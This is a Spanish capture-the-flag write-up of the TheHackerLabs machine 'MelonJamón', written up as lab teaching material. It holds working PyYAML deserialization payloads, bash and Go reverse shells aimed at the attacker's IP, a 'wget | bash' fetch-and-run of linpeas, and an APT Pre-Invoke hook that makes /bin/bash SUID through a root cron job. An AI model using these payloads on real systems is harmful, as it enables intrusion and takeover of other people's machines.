---
title: "MelonJamón - TheHackerLabs"
date: 2025-08-12
draft: false
slug: "THL-writeup-melonJamon"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que existe un dominio al que se nos redirige cuando intentamos entrar a la página web activa del puerto 80, siendo esto el uso de Virtual Hosting. Agregamos ese dominio al /etc/hosts, para ver de manera correcta la página web. Al no encontrar nada, decidimos aplicar Fuzzing, logrando descubrir un directorio oculto que almacena una página que permite la carga de archivos. En el código fuente, se nos da una pista de que la página web de carga de archivos utiliza YAML. Realizamos un Ataque de Deserialización YAML de Python para cargar una Reverse Shell, logrando ganar acceso principal a la máquina víctima. Dentro, descubrimos que nuestro usuario tiene privilegios de otro usuario sobre el binario go. Creamos un script que almacena una Reverse Shell y usamos go con los privilegios del usuario para ejecutarlo, ganando acceso como este. Ya como el nuevo usuario, utilizamos la herramienta linpeas.sh y pspy64, logrando identificar que es posible modificar el directorio apt.conf.d y su contenido. Además, encontramos que se está ejecutando una tarea CRON que actualiza el sistema con el comando apt update. Sabiendo todo esto, abusamos de la funcionalidad de APT para inyectar comandos que le den permisos SUID a la Bash, siendo así que nos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "Python YAML Serialization (PyYAML)", "Web Enumeration", "Fuzzing", "YAML Deserialization Attack (Python)", "Abusing Sudoers Privilege", "Abusing go Binary (Sudoers)", "System Recognition (Linux)", "Abusing APT Functionality", "Privesc - Abusing APT Functionality", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "base64"
  - "nano"
  - "tcpdump"
  - "nc"
  - "grep"
  - "sudo"
  - "go"
  - "cat"
  - "python3"
  - "wget"
  - "linpeas.sh"
  - "pspy64"
  - "chmod"
  - "bash"
links:
  - "https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html"
  - "https://skf.gitbook.io/asvs-write-ups/deserialisation-yaml-des-yaml/deserialisation-yaml"
  - "https://github.com/j0lt-github/python-deserialization-attack-payload-generator"
  - "https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/#pyyaml"
  - "https://www.revshells.com/"
  - "https://github.com/peass-ng/PEASS-ng/tree/master"
  - "https://github.com/DominicBreuker/pspy"
  - "https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-melonJamon/melonjamon.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.30
PING 192.168.100.30 (192.168.100.30) 56(84) bytes of data.
64 bytes from 192.168.100.30: icmp_seq=1 ttl=64 time=2.06 ms
64 bytes from 192.168.100.30: icmp_seq=2 ttl=64 time=1.01 ms
64 bytes from 192.168.100.30: icmp_seq=3 ttl=64 time=2.04 ms
64 bytes from 192.168.100.30: icmp_seq=4 ttl=64 time=0.842 ms

--- 192.168.100.30 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3157ms
rtt min/avg/max/mdev = 0.842/1.485/2.056/0.564 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.30 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:31 CST
Initiating ARP Ping Scan at 11:31
Scanning 192.168.100.30 [1 port]
Completed ARP Ping Scan at 11:31, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:31
Scanning 192.168.100.30 [65535 ports]
Discovered open port 80/tcp on 192.168.100.30
Discovered open port 22/tcp on 192.168.100.30
Completed SYN Stealth Scan at 11:31, 24.96s elapsed (65535 total ports)
Nmap scan report for 192.168.100.30
Host is up, received arp-response (0.00070s latency).
Scanned at 2025-08-12 11:31:12 CST for 25s
Not shown: 60094 closed tcp ports (reset), 5439 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.22 seconds
           Raw packets sent: 83344 (3.667MB) | Rcvd: 60098 (2.404MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 2 puertos abiertos, y supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.30 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:31 CST
Nmap scan report for 192.168.100.30
Host is up (0.00086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 c3:a4:0c:86:41:74:73:6a:5b:b2:79:9a:3d:2f:1c:26 (ECDSA)
|_  256 20:5f:bb:6a:7d:73:fb:5f:ae:4a:f1:bc:79:62:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.61

|_http-title: Did not follow redirect to http://melonjamon.thl/
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: melonjamon.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Observa que el escaneo indica una redirección a un dominio cuando escaneo la página web activa del **puerto 80**.

Registremos ese dominio en el `/etc/hosts`:
```bash
echo "192.168.100.30 melonjamon.thl" >> /etc/hosts
```
Listo, no deberíamos tener problemas al visitar esa página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-melonJamon/Captura1.png">
</p>

Es una página simple que muestra melón envuelto con jamón.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-melonJamon/Captura2.png">
</p>

No hay mucho que destacar.

Revisando el código fuente, tampoco encontraremos algo.

Apliquemos **Fuzzing** para identificar algún directorio web oculto.

### Fuzzing y Análisis de Directorio Oculto Encontrado {#fuzz}

Primero usemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://melonjamon.thl/FUZZ/ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://melonjamon.thl/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

icons                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]
javascript              [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 62ms]
gettingstarted          [Status: 200, Size: 461, Words: 61, Lines: 15, Duration: 42ms]
                        [Status: 200, Size: 1541, Words: 558, Lines: 59, Duration: 42ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 63ms]
:: Progress: [207629/207629] :: Job [1/1] :: 2225 req/sec :: Duration: [0:01:18] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://melonjamon.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://melonjamon.thl/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 321] [--> http://melonjamon.thl/javascript/]
/gettingstarted       (Status: 308) [Size: 261] [--> http://melonjamon.thl/gettingstarted/]
/server-status        (Status: 403) [Size: 279]
Progress: 207629 / 207630 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

En ambos casos encontramos el directorio `/gettingstarted`, así que vamos a verlo:

<p align="center">
<img src="/assets/images/THL-writeup-melonJamon/Captura3.png">
</p>

Es una página que nos permite subir archivos.

Si revisamos su código fuente, encontraremos un mensaje en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-melonJamon/Captura4.png">
</p>

Y si lo decodificamos, tendremos este mensaje:
```bash
echo -n "eWFtbDogdGhlIHBhZ2UgaXMgdW5kZXIgY29uc3RydWN0aW9u" | base64 -d
yaml: the page is under construction
```
Entonces, la página está utilizando **YAML**.

Busquemos una forma de aprovecharnos de esto.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Ataque de Deserialización YAML de Python {#YAML}

Primero, entendamos que es un **Ataque de Deserialización YAML**:

| **Ataque de Deserialización YAML** |
| :------------: |
| *Un ataque de deserialización YAML ocurre cuando una aplicación carga datos YAML proporcionados por un usuario y los deserializa (convierte de texto a objetos en memoria) sin validarlos ni limitar qué tipos de objetos se pueden crear. En ese proceso, si la librería usada (por ejemplo, PyYAML, SnakeYAML, etc.) permite crear instancias de clases arbitrarias o ejecutar código al cargar, un atacante puede inyectar instrucciones maliciosas en el YAML para que, al deserializarlo, la aplicación ejecute comandos o acciones no deseadas.* |

El problema que tenemos aquí es que no sabemos qué **motor YAML** se está ocupando, es decir, si es de **JavaScript, Python, Ruby**, etc.

Por lo que podemos probar a subir varios payloads que puedes encontrar en esta joya de blog:
* <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/" target="_blank">Swisskyrepo: Insecure Deserialization</a>

Después de varias pruebas, logramos descubrir que está utilizando **Python** y posiblemente la librería **PyYAML**.

Pues al probar el siguiente payload, la página se queda cargando por 10 segundos, tal como lo indica el payload:
```bash
nano test.yaml
--------------
!!python/object/apply:time.sleep [10]
```
Es posible que el script de la página web esté utilizando la función `yaml.load()` con el loader `UnsafeLoader`, que si no limita el tipo de objetos que se cargan, **PyYAML** puede ejecutar código arbitrario durante la deserialización, porque permite instanciar clases arbitrarias y ejecutar sus constructores.

Entonces, estos payloads funcionarán contra la página web:
* <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/#pyyaml" target="_blank">Swisskyrepo: Insecure Deserialization - PyYAML</a>

Si los analizamos, nos damos cuenta de que es posible ejecutar comandos.

Lo que podríamos hacer, es tratar de enviarnos una **traza ICMP** para comprobar si es posible la conexión entre la máquina víctima y la nuestra, abusando de esta vulnerabilidad.

Inicia **tcpdump** para que capture **paquetes ICMP**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Utiliza cualquiera de los siguiente payloads modificados:
```bash
!!python/object/apply:os.system ["ping -c 1 Tu_IP"]
!!python/object/apply:os.popen ["ping -c 1 Tu_IP"]
!!python/object/new:subprocess [["ping","-c","1","Tu_IP"]]
!!python/object/new:subprocess.check_output [["ping","-c","1","Tu_IP"]]
```
Carga el payload en un archivo de prueba y súbelo a la página.

Una vez que lo subas, observa el **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
17:33:03.353089 IP 192.168.100.30 > Tu_IP: ICMP echo request, id 24017, seq 1, length 64
17:33:03.353122 IP Tu_IP > 192.168.100.30: ICMP echo reply, id 24017, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```
Excelente, funciona.

Entonces, podemos mandarnos una **Reverse Shell** que podemos agregar a cualquiera de los payloads.

En mi caso, usé el siguiente:
```bash
yaml: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'"]
```
Guárdalo en un archivo.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```
Carga el **archivo YAML**.

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.30] 39916
bash: cannot set terminal process group (472): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Melonjamon:/$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Listo, continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Linux y Obteniendo Reverse Shell como el Usuario melon {#linEnum}

Antes de avanzar, busquemos el archivo web vulnerable al **Ataque de Deserialización YAML de Python**.

Podemos ver el directorio de la página web en la ruta `/var/www/melonjamon`:
```bash
www-data@TheHackersLabs-Melonjamon:/$ ls -la /var/www/melonjamon/
total 512
drwxr-xr-x 4 www-data www-data   4096 Aug  1  2024 .
drwxr-xr-x 4 root     root       4096 Jul 30  2024 ..
drwxr-xr-x 5 www-data www-data   4096 Aug  1  2024 gettingstarted
-rwxr-xr-x 1 www-data www-data   1541 Jul 30  2024 index.html
-rwxr-xr-x 1 www-data www-data 142862 Jul 30  2024 logo-melon.png
-rwxr-xr-x 1 www-data www-data 357229 Jul 30  2024 melon.jpg
drwxr-xr-x 5 www-data www-data   4096 Aug  1  2024 venv
```
Y en el directorio `/gettingstarted`, encontramos el script **app.py** que es el vulnerable.

Veámoslo:
```bash
www-data@TheHackersLabs-Melonjamon:/$ cat /var/www/melonjamon/gettingstarted/app.py 
from flask import Flask, render_template, request
import yaml
from yaml.loader import UnsafeLoader

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    try:
        content = yaml.load(file, Loader=UnsafeLoader)
    except yaml.YAMLError as exc:
        return render_template("index.html")

    return render_template("index.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
Justamente se está usando la función `yaml.load()` y el **Loader** es **UnsafeLoader**, siento esto lo que permitió que explotáramos la **Deserialización**.

Continuemos.

Veamos los usuarios existentes:
```bash
www-data@TheHackersLabs-Melonjamon:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
melon:x:1001:1001:,,,:/home/melon:/bin/bash
```

Solo hay un usuario y encontraremos su directorio en el `/home`, pero no podremos ver su contenido:
```bash
www-data@TheHackersLabs-Melonjamon:/$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Aug  2  2024 .
drwxr-xr-x 18 root  root  4096 Jul 22  2024 ..
drwx------  4 melon melon 4096 Aug  2  2024 melon
```

Curiosamente, podemos ver los privilegios de nuestro **usuario www-data**:
```bash
www-data@TheHackersLabs-Melonjamon:/$ sudo -l
sudo: unable to resolve host TheHackersLabs-Melonjamon: Name or service not known
Matching Defaults entries for www-data on TheHackersLabs-Melonjamon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on TheHackersLabs-Melonjamon:
    (melon) NOPASSWD: /usr/bin/go
```
Podemos usar el comando **go** como el **usuario melon**.

Como ese comando ejecuta scripts de **go**, entonces, se me ocurre que podemos ejecutar un script que contenga una **Reverse Shell**.

Aquí puedes obtener una **Reverse Shell** de **Golang**:
* <a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>

<p align="center">
<img src="/assets/images/THL-writeup-melonJamon/Captura5.png">
</p>

Ocuparemos solo la siguiente instrucción:
```bash
package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","Tu_IP:1337");cmd:=exec.Command("bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
```

Muevete al directorio `/tmp` y ahí guarda la **Reverse Shell**:
```bash
www-data@TheHackersLabs-Melonjamon:/$ cd tmp
www-data@TheHackersLabs-Melonjamon:/tmp$ nano revShellGO.go
```

Abre otro listener con **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
```

Ejecuta la **Reverse Shell** con el comando **go** como el **usuario melon**:
```bash
www-data@TheHackersLabs-Melonjamon:/tmp$ sudo -u melon go run revShellGO.go
sudo: unable to resolve host TheHackersLabs-Melonjamon: Name or service not known
```

Observa la **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.30] 53010
whoami
melon
```

Ya solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

Ya podemos ver la flag del usuario:
```bash
melon@TheHackersLabs-Melonjamon:/tmp$ cd /home/melon/
melon@TheHackersLabs-Melonjamon:~$ ls
user.txt
melon@TheHackersLabs-Melonjamon:~$ cat user.txt
...
```

### Escalando Privilegios Abusando de Funcionalidad APT y Tareas CRON {#APT}

Para esta parte, ocuparemos las herramientas **linpeas.sh** y **pspy64**, que puedes descargar de los siguientes repositorios:
* <a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: PEASS-ng</a>
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy64</a>

Vamos a utilizar primero **linpeas.sh** para buscar alguna vulnerabilidad dentro de la máquina.

Abre un servidor web con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina víctima, ejecuta **linpeas.sh** de manera remota con **wget**:
```bash
melon@TheHackersLabs-Melonjamon:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
```

Observa el siguiente punto que resalta en amarillo (probabilidad del 95% de **Escalada de Privilegios**):
```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
...
/etc/apt/apt.conf.d
/etc/apt/apt.conf.d/00CDMountPoint
/etc/apt/apt.conf.d/00trustcdrom
/etc/apt/apt.conf.d/01autoremove
/etc/apt/apt.conf.d/20apt-show-versions
/etc/apt/apt.conf.d/70debconf
...
```
Podemos editar los archivos del directorio **apt.conf.d**.

| **Directorio apt.conf.d** |
|:------------:|
| *Es una carpeta de fragmentos de configuración que APT lee cada vez que lo ejecutas. Entre muchas cosas, ahí puedes definir “hooks” (ganchos) que APT ejecuta antes o después de ciertas acciones.* |

En este caso, los **hooks** que podemos crear en ese directorio son:
* `APT::Update::Pre-Invoke` / `APT::Update::Post-Invoke(-Success)`: Son comandos que se ejecutan antes (`Pre-Invoke`) o despues (`Post-Invoke(-Success)`) al hacer **apt update**.
* `DPkg::Pre-Invoke` / `DPkg::Post-Invoke`: Son comandos que se ejecutan cuando **APT** llama a **dpkg** (instalar/actualizar paquetes).

Además, **APT** carga los archivos en orden alfabético, así que nombres con números altos **(90…, 99…)** se leen al final y pueden añadir ajustes previos.

Entonces, la idea es que ocupemos la misma sintaxis de estos archivos para agregar un comando que nos ayude a escalar privilegios.

Tenemos este blog que nos lo puede explicar un poco mejor (ve al tema **Exploiting Cron job**):
* <a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/" target="_blank">Linux for Pentester: APT Privilege Escalation</a> 

El problema ahora es que, como nuestro usuario actual, no serviría de mucho ejecutar **apt update** para cargar nuestro archivo malicioso, pues no nos ayudaría a escalar privilegios.

Quizá exista una **tarea CRON** que nos permita abusar de estos archivos.

Si aún tienes el servidor web de **Python3** activo, descarga **pspy64** en la máquina víctima:
```bash
melon@TheHackersLabs-Melonjamon:~$ wget http://Tu_IP/pspy64
melon@TheHackersLabs-Melonjamon:~$ chmod +x pspy64
```

Ejecútalo:
```bash
2025/08/12 22:29:46 CMD: UID=42    PID=8267   | gpgconf --kill all 
2025/08/12 22:29:46 CMD: UID=42    PID=8268   | /bin/sh /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.Wd4k11 /tmp/apt.data.G3zruL 
2025/08/12 22:29:46 CMD: UID=0     PID=8269   | /usr/bin/apt update 
2025/08/12 22:29:46 CMD: UID=0     PID=8270   | /usr/bin/apt update 
2025/08/12 22:29:46 CMD: UID=0     PID=8271   | sh -c test -x /usr/bin/apt-show-versions || exit 0 ; apt-show-versions -i 
2025/08/12 22:29:46 CMD: UID=0     PID=8272   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:46 CMD: UID=0     PID=8273   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:46 CMD: UID=0     PID=8274   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:46 CMD: UID=0     PID=8275   | sh -c apt-get indextargets -o Dir::State::lists=/var/lib/apt/lists/ --format='$(FILENAME)' 'Created-By: Packages' 
2025/08/12 22:29:46 CMD: UID=0     PID=8276   | apt-get indextargets -o Dir::State::lists=/var/lib/apt/lists/ --format=$(FILENAME) Created-By: Packages 
2025/08/12 22:29:47 CMD: UID=0     PID=8277   | apt-get indextargets -o Dir::State::lists=/var/lib/apt/lists/ --format=$(FILENAME) Created-By: Packages 
2025/08/12 22:29:47 CMD: UID=0     PID=8278   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:47 CMD: UID=0     PID=8279   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:48 CMD: UID=0     PID=8280   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:48 CMD: UID=0     PID=8281   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:48 CMD: UID=0     PID=8282   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:48 CMD: UID=0     PID=8283   | /usr/bin/perl -w /usr/bin/apt-show-versions -i 
2025/08/12 22:29:48 CMD: UID=0     PID=8284   | /usr/bin/apt update 
2025/08/12 22:29:49 CMD: UID=0     PID=8285   | /usr/bin/apt update
```
Observa que cada minuto se está ejecutando el comando **apt update** como el **Root**.

Sabiendo esto, ahora sí es posible que podamos escalar privilegios con el directorio **apt.conf.d**.

Vamos a crear un **hook** que ejecute un comando que asigne **permisos SUID** a la **Bash**.

Revisa los permisos de la **Bash**:
```bash
melon@TheHackersLabs-Melonjamon:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Usaremos el **hook** `APT::Update::Pre-Invoke` (aunque puede ser cualquiera de los dos), siguiendo la misma sintaxis que los demás archivos de **APT** para ejecutar comandos:
```bash
melon@TheHackersLabs-Melonjamon:~$ cd /etc/apt/apt.conf.d
melon@TheHackersLabs-Melonjamon:~$ nano 02privesc
--------------
APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};
```

Una vez creado, esperemos un minuto y vuelve a revisar los permisos de la **Bash**:
```bash
melon@TheHackersLabs-Melonjamon:/etc/apt/apt.conf.d$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```
Excelente, funcionó.

Podemos ejecutar la **Bash** con privilegios:
```bash
melon@TheHackersLabs-Melonjamon:/etc/apt/apt.conf.d$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
